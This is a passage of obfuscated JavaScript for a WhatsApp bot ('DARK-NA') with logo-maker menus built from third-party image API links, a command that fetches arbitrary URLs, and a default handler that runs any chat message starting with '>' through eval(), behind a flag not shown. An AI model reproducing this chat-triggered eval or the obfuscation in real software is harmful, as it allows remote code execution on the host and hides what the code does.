                'title': "Burn Paper",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/burn_paper?text=" + _0x1b3106
              }, {
                'title': "Naruto",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/naruto?text=" + _0x1b3106
              }, {
                'title': "Love Message",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/love_message?text=" + _0x1b3106
              }, {
                'title': "TikTok",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/tik_tok?text=" + _0x1bb2b8 + "&text_2=" + _0x596792
              }, {
                'title': "Flower Heart",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/flower_heart?text=" + _0x1b3106
              }, {
                'title': "Wodden Board",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/wodden_board?text=" + _0x1b3106
              }, {
                'title': "Glowing Neon",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/glowing_neon?text=" + _0x1b3106
              }, {
                'title': 'Butterfly',
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/butterfly?text=" + _0x1b3106
              }, {
                'title': "Metallic",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/metallic?text=" + _0x1b3106
              }, {
                'title': "Kayu",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/kayu?text=" + _0x1b3106
              }, {
                'title': 'Horror',
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/horror?text=" + _0x1b3106
              }, {
                'title': 'Permen',
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/permen?text=" + _0x1b3106
              }, {
                'title': "Silk",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/silk?text=" + _0x1b3106
              }, {
                'title': "Batik",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/batik?text=" + _0x1b3106
              }, {
                'title': "Nature 3D",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/nature3d?text=" + _0x1b3106
              }, {
                'title': "Summer 3D",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/summer3d?text=" + _0x1b3106
              }, {
                'title': "Faill",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/fall?text=" + _0x1b3106
              }, {
                'title': "Neon Lights",
                'rowId': ".dlogo https://api.akuari.my.id/photooxy/neonlights?text=" + _0x1b3106
              }]
            }];
            const _0x48dc47 = {
              'text': "Results for " + _0x1b3106,
              'footer': config.FOOTER,
              'title': "Astro-MD Logo Maker",
              'buttonText': "Results",
              'sections': _0x8210c4
            };
            await _0x1303d3.sendMessage(_0x2ab1fb, _0x48dc47, {
              'quoted': _0x49cb26
            });
          } catch (_0x4f952a) {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "error"
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "dlogo":
          try {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '🪄',
                'key': _0x49cb26.key
              }
            });
            _0x33e5d9("Genarating...");
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'image': {
                'url': _0x1b3106
              },
              'caption': config.CAPTION
            }, {
              'quoted': _0x49cb26
            });
          } catch (_0x34b02b) {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "error"
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case 'ffffffff':
          try {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': "🤹‍♀️",
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return await _0x1303d3.sendMessage(_0x2ab1fb, {
                'text': "Type a name"
              }, {
                'quoted': _0x49cb26
              });
            }
            let _0x11e3bb = _0x3d7650[0x1] ? _0x3d7650[0x1] : '.';
            let _0x1f3a62 = _0x3d7650[0x0];
            const _0x7e559 = [{
              'title': "Logo Results",
              'rows': [{
                'title': "Spring",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Spring&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': 'Alien-Neon',
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Alien-Neon&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "=Dark-Night",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Dark-Night&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Deluxe",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Deluxe&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Green-Dragon",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Green-Dragon&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Layer-Cake",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Layer-Cake&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Alien-Invasion",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Alien-Invasion&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Winter-Frost",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Winter-Frost&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': 'lying-Letters',
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Flying-Letters&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Sota-Chrome",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Sota-Chrome&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': 'Water',
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Water&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Perspective",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Perspective&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Style",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Style&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Blackbird",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Blackbird&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Smurfs",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Smurfs&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Military",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Military&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Electric",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Electric&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Grass",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Grass&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': 'Runner',
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Runner&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "April-Fool",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=April-Fool&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Fabulous",
                'rowId': ".dlogo https://api-ravindumanoj.ml/?code=attp_i&type=Fabulous&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "Fluffy",
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Fluffy&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': "World-Cup-2014",
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=World-Cup-2014&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Neon&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Graffiti-3D&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Glow&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Thanksgiving-1&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Fortune&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Supermarket&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Winner&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Clan&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Amped&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Chrominium&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Crafts&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Fire&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Graffiti-Burn&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Global&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Beauty&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Steel&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Silver&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Cookies&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Minions&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Harry-Potter&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Birdy&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Uprise&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Inferno&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Fitness&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Mardi-Gras&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Roman&api=YourApiKey&text=" + _0x1b3106
              }, {
                'title': '',
                'rowId': ".datt https://api-ravindumanoj.ml/?code=attp_i&type=Star-Wars&api=YourApiKey&text=" + _0x1b3106
              }]
            }];
            const _0x282fa1 = {
              'text': "Results for " + _0x1b3106,
              'footer': config.FOOTER,
              'title': "CyberX Logo Maker",
              'buttonText': "Results",
              'sections': _0x7e559
            };
            await _0x1303d3.sendMessage(_0x2ab1fb, _0x282fa1, {
              'quoted': _0x49cb26
            });
          } catch (_0x462ff7) {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "error"
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        case "down":
          try {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'react': {
                'text': '⬇️',
                'key': _0x49cb26.key
              }
            });
            if (!_0x1b3106) {
              return _0x33e5d9("Give Direct link");
            }
            if (!_0x1b3106.includes("http")) {
              return _0x33e5d9("Enter direct Link");
            }
            const _0x53673a = await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': config.FILE_DOWN
            }, {
              'quoted': _0x49cb26
            });
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'delete': _0x53673a.key
            });
            const _0x289638 = await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': config.FILE_UP
            }, {
              'quoted': _0x49cb26
            });
            const _0x9eeb44 = _0x1303d3.sendMessage(_0x2ab1fb, {
              'document': {
                'url': _0x3d7650[0x0]
              },
              'fileName': _0x3d7650[0x0] + _0x3d7650[0x1]
            }, {
              'quoted': _0x49cb26
            });
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'delete': _0x289638.key
            });
          } catch (_0x1feaad) {
            await _0x1303d3.sendMessage(_0x2ab1fb, {
              'text': "error\n\n" + _0x1feaad
            }, {
              'quoted': _0x49cb26
            });
          }
          break;
        default:
          if (_0xde13b1 && _0x5a18c7.startsWith('>')) {
            try {
              await _0x33e5d9(util.format(await eval("(async () => {" + _0x5a18c7.slice(0x1) + "})()")));
            } catch (_0x4bf585) {
              await _0x33e5d9(util.format(_0x4bf585));
            }
          }
      }
    } catch (_0xbe8f39) {
      const _0x3383bf = String(_0xbe8f39);
      console.log(_0x3383bf);
    }
  });
}
app.get('/', (_0x532ec5, _0x5351ff) => {
  _0x5351ff.send("📟 DARK-NA Working successfully!");
});
app.listen(port, () => console.log("DARK-NA Server listening on port http://localhost:" + port));
setTimeout(() => {
  connectToWA();
}, 0xbb8);
